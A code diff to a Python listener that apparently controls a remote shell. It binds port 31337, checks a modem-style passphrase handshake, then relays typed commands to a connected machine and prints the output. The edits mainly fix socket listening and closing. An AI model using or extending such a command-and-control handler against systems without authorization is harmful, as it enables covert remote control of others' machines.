@@ -17,15 +17,15 @@ def catchSessionStartup(s):
     while True:
  
         # The user can control-C, of course
-        print("[*] Beginning listening loop")
-        s.listen()
+        #print("[*] Beginning listening loop")
+        #s.listen() # We now listen in main()
        
         conn, addr = s.accept()
         print(f"[*] Connection from {addr[0]}. Verifying passphrase")
         passphrase = conn.recv(512)
         if re.search("ATDT18005551234", passphrase.decode()):
             print(f"\t[*] Connection from {addr[0]} is valid!")
-            conn.send("ATA".encode())
+            conn.sendall("ATA".encode())
             confirmation = conn.recv(512)
             if re.search("CONNECT", confirmation.decode()):
                 # Checks are good, moving on.
@@ -46,12 +46,14 @@ def catchSessionStartup(s):
             while True:
                 command = input("[*] Command: ")
                 if command == "ATH":
+                   s.close()
                    return 0
                 # print(f"I'm sending: {command}") # DEBUG output
                 try:
                     conn.sendall(command.encode())
                 except OSError as e:
                     print(f"Exception: {e}")
+                    s.close() 
                     return -1
                 output = conn.recv(1024)
                 try:
@@ -78,6 +80,7 @@ def main():
     s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 5)
     try:
         s.bind(("0.0.0.0", 31337)) # Tee-hee
+        s.listen()
     except OSError as e:
         print("[!] Initializing failed: Could not bind port 31337; is it in use?")
         print(f"OS Error: {e}")
